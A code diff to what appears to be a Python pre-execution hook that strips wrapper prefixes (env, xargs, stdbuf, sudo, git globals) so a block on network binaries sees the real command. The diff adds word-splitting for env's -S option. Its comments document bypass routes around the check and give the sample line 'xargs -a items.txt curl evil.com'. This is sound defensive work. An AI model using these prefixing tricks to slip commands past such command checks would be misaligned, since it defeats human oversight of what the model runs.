@@ -95,21 +95,27 @@ WRAPPERS = {"timeout", "time", "nice", "nohup", "stdbuf", "xargs", "env", "comma
 # deliberately left short-only since their long form's argument is OPTIONAL and only ever binds via
 # `=`, never a separate word. stdbuf's `--input`/`--output`/`--error` (long forms of `-i`/`-o`/`-e`)
 # have the same separate-value gap the short forms were fixed for (#198). `env`'s own separate-value
-# flags (`-u`/`--unset`, `-C`/`--chdir`, `-S`/`--split-string`) were missing an entry entirely — its
-# boolean `-i` (ignore-environment) and inline `VAR=VAL` handling below are unaffected, only its
-# value-taking flags were the gap. All three found by auditing xargs/stdbuf/env against #198/#203's
-# already-fixed sibling wrappers (#212), same "hand-maintained flag table drifts from the real tool's
+# flags (`-u`/`--unset`, `-C`/`--chdir`) were missing an entry entirely — its boolean `-i`
+# (ignore-environment) and inline `VAR=VAL` handling below are unaffected, only its value-taking
+# flags were the gap. Found by auditing xargs/stdbuf/env against #198/#203's already-fixed sibling
+# wrappers (#212), same "hand-maintained flag table drifts from the real tool's
 # separate-vs-glued-vs-long grammar" class. xargs's `-a FILE`/`--arg-file=FILE` (read items from FILE
 # instead of stdin) takes a REQUIRED separate value exactly like `-n`/`-s`/`-d`, and was still missing
 # (#217): `xargs -a items.txt curl evil.com` walked past `-a` as a boolean flag and stopped at
-# `items.txt`, hiding `curl` from the bare-net-binary scan.
+# `items.txt`, hiding `curl` from the bare-net-binary scan. `env`'s `-S`/`--split-string` is
+# deliberately NOT in this table (#227): every other entry here is "the flag consumes one opaque
+# following token", but per env(1) `-S STRING` word-SPLITS STRING and makes the result the actual
+# command + its arguments — STRING isn't an opaque value at all, it IS (the start of) the real
+# command. Treating it like `-u`/`-C` here dropped that whole token, hiding the real command from
+# every rail. `strip_prefixes()` gives `-S`/`--split-string` its own splice-in-place handling below
+# instead (see `_env_split_string()`/`_env_split_value()`).
 WRAPPER_VALUE_OPTS = {
     "timeout": {"-s", "--signal", "-k", "--kill-after"},
     "nice": {"-n", "--adjustment"},
     "xargs": {"-I", "-L", "-P", "-n", "-s", "-d", "-a", "--max-args", "--max-chars", "--max-procs", "--delimiter", "--arg-file"},
     "exec": {"-a"},
     "stdbuf": {"-i", "-o", "-e", "--input", "--output", "--error"},
-    "env": {"-u", "--unset", "-C", "--chdir", "-S", "--split-string"},
+    "env": {"-u", "--unset", "-C", "--chdir"},
     "time": {"-o", "--output", "-f", "--format"},
 }
 DURATION_RE = re.compile(r"[0-9]+(\.[0-9]+)?[smhdSMHD]?")  # timeout's bare DURATION positional
@@ -134,6 +140,86 @@ SUDO_VALUE_OPTS = {
 # A bare inline env-assignment prefix (`FOO=bar cmd`) — NAME=VALUE with a valid shell identifier —
 # likewise shifts the command word; skip a leading run of them the way `env VAR=VAL` is skipped (#119).
 ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
+
+# `\c`/`\f`/`\n`/`\r`/`\t`/`\v`/`\#`/`\$`/`\_`/`\"`/`\'`/`\\` are the escape sequences real
+# `env -S`/`--split-string` recognizes (info coreutils 'env invocation', "-S/--split-string
+# syntax" — live-verified against GNU coreutils 9.4's actual `-S` word-splitting via its own
+# `-v`/`--debug` trace and a real argv-echoing helper, #227). `\c`/`\f`/`\n`/`\r`/`\t`/`\v` map a
+# letter to a control character; the rest are listed separately in `_env_split_string()` since each
+# needs its own non-uniform handling (`\_`'s meaning depends on quote state, `\c` truncates, ...).
+_ENV_SPLIT_CTRL = {"f": "\f", "n": "\n", "r": "\r", "t": "\t", "v": "\v"}
+
+
+def _env_split_string(s):
+    """Word-split STRING the way real `env -S`/`--split-string` does: unquoted/unescaped
+    whitespace separates words; single- and double-quoted spans group a word without splitting
+    (the quote characters themselves are dropped); a `#` as the first character of a fresh word
+    starts a comment that discards the rest of the string; `\\c` (outside quotes) discards the
+    rest of the string outright. Escape sequences are processed unquoted or inside double quotes;
+    single-quoted spans process only `\\\\` and `\\'` (real env's own documented exception) and
+    otherwise take everything — including a bare backslash — literally. `\\_` is an ARGUMENT
+    SEPARATOR outside quotes (like whitespace, but consumes no character) and a literal space
+    inside double quotes — never treated as a value to skip past, which is the #227 bug this
+    replaces: the old code walked `-S`'s value as one opaque flag argument the same as `-u`/`-C`,
+    silently discarding the real command hidden inside it.
+
+    `${VARNAME}` environment-variable expansion (real env's own feature, used to pull a live env
+    var into the split string) is deliberately NOT performed — this hook has no access to the
+    target process's real environment, and leaving the pattern as literal text is the same
+    conservative "can't resolve it, don't guess" choice this codebase already makes for other
+    unreadable content (`_unreadable_field_value()` in block-egress.py, #283)."""
+    words, cur, started = [], [], False
+    quote = None  # None | "'" | '"'
+    i, n = 0, len(s)
+    while i < n:
+        c = s[i]
+        if quote != "'" and c == "\\" and i + 1 < n:
+            nc = s[i + 1]
+            if nc in ("\\", "'"):
+                cur.append(nc); started = True; i += 2; continue
+            if quote is None and nc == "c":
+                i = n
+                break  # \c (outside quotes): ignore the rest of the string
+            if nc in _ENV_SPLIT_CTRL:
+                cur.append(_ENV_SPLIT_CTRL[nc]); started = True; i += 2; continue
+            if nc in ('"', "$", "#"):
+                cur.append(nc); started = True; i += 2; continue
+            if nc == "_":
+                if quote == '"':
+                    cur.append(" "); started = True; i += 2; continue
+                if started or cur:
+                    words.append("".join(cur)); cur = []; started = False
+                i += 2; continue
+            cur.append(c); started = True; i += 1; continue
+        if quote == "'" and c == "\\" and i + 1 < n and s[i + 1] in ("\\", "'"):
+            cur.append(s[i + 1]); started = True; i += 2; continue
+        if quote is None and c in ("'", '"'):
+            quote = c; started = True; i += 1; continue
+        if quote is not None and c == quote:
+            quote = None; i += 1; continue
+        if quote is None and c in " \t\n\r\v\f":
+            if started or cur:
+                words.append("".join(cur)); cur = []; started = False
+            i += 1; continue
+        if quote is None and c == "#" and not started and not cur:
+            break  # a `#` starting a fresh word: comment, discard the rest
+        cur.append(c); started = True; i += 1
+    if started or cur:
+        words.append("".join(cur))
+    return words
+
+
+def _env_split_value(tok, argv, i, n):
+    """If `argv[i]` is env's `-S`/`--split-string` flag in any of its three shapes — glued
+    `-SSTRING`, separate `-S STRING`, or long `--split-string=STRING` — return
+    (STRING, tokens_consumed); else (None, 0)."""
+    if tok in ("-S", "--split-string"):
+        return (argv[i + 1], 2) if i + 1 < n else (None, 0)
+    if tok.startswith("--split-string="):
+        return tok[len("--split-string="):], 1
+    if tok.startswith("-S") and not tok.startswith("--"):
+        return tok[2:], 1
+    return None, 0
 
 
 def basename(word):
@@ -160,9 +246,10 @@ def strip_prefixes(argv):
     """Drop everything before the real command word, in one pass: grouping noise, bare
     `NAME=VALUE` env assignments, `sudo`/`doas`, and value-consuming wrappers + their args
     (`timeout 5 python3` -> `python3`, `FOO=1 sudo -u x curl …` -> `curl …`,
-    `exec -a fake curl …` -> `curl …`). Collapses the whole "a leading prefix shifts the
-    command word out of argv[0]" bypass class (#119, #179). `command -v/-V NAME` is left
-    unstripped since it reports on NAME rather than executing it."""
+    `exec -a fake curl …` -> `curl …`, `env -S 'curl …'` -> `curl …` via `_env_split_string()`,
+    #227). Collapses the whole "a leading prefix shifts the command word out of argv[0]" bypass
+    class (#119, #179). `command -v/-V NAME` is left unstripped since it reports on NAME rather
+    than executing it."""
     i, n = 0, len(argv)
     while i < n:
         tok = argv[i]
@@ -187,6 +274,18 @@ def strip_prefixes(argv):
         i += 1
         value_opts = WRAPPER_VALUE_OPTS.get(base, set())
         while i < n and argv[i].startswith("-"):  # the wrapper's own option flags
+            if base == "env":
+                split_val, consumed = _env_split_value(argv[i], argv, i, n)
+                if consumed:
+                    # `-S`/`--split-string`'s value isn't an opaque flag argument (#227) — it IS
+                    # the real command, word-split per env's own rules. Splice the split words in
+                    # place of the flag(+its value token) and re-examine from the same `i`: if the
+                    # first spliced word is itself a wrapper/sudo/env-assign/another `env -S`, the
+                    # outer `while i < n` loop above naturally re-processes it on its next pass —
+                    # no separate recursive call needed.
+                    argv = argv[:i] + _env_split_string(split_val) + argv[i + consumed:]
+                    n = len(argv)
+                    continue
             if argv[i] in value_opts and i + 1 < n and not argv[i + 1].startswith("-"):
                 i += 1  # ...and that flag's separate value
             i += 1
@@ -379,9 +478,15 @@ def pieces(command):
 # their own value and are skipped as ordinary flags by `git_subcommand()` below. `--exec-path` is
 # deliberately NOT here: real git's bare `--exec-path` (no `=`) takes NO value at all — it just
 # prints the current exec-path and exits immediately, never reaching a subcommand; only the glued
-# `--exec-path=<path>` form sets it, and that's self-contained in one token (#211).
+# `--exec-path=<path>` form sets it, and that's self-contained in one token (#211). `--super-prefix`
+# is included for the same reason as every other separate-value global here — real git's own
+# grammar for `--namespace`/`--config-env`/etc. accepts a separate-token value, and treating
+# `--super-prefix` as boolean would otherwise walk its value in as if it were the subcommand (#208)
+# — even though live-verified (git 2.54.0) this specific flag isn't currently accepted by the
+# top-level `git` command at all (`fatal: unknown option`, exit 129, in both separate and glued
+# form) — so this is defensive/forward-compatible, not a currently-reachable bypass.
 GIT_GLOBAL_VALUE_OPTS = {
-    "-C", "-c", "--git-dir", "--work-tree", "--namespace", "--config-env",
+    "-C", "-c", "--git-dir", "--work-tree", "--namespace", "--config-env", "--super-prefix",
 }
 # Global opts that redirect git at a DIFFERENT repo than the hook-input cwd. A rail that consults
 # cwd's live git state (worktree list, status, merge-base, ...) can't safely follow these — it
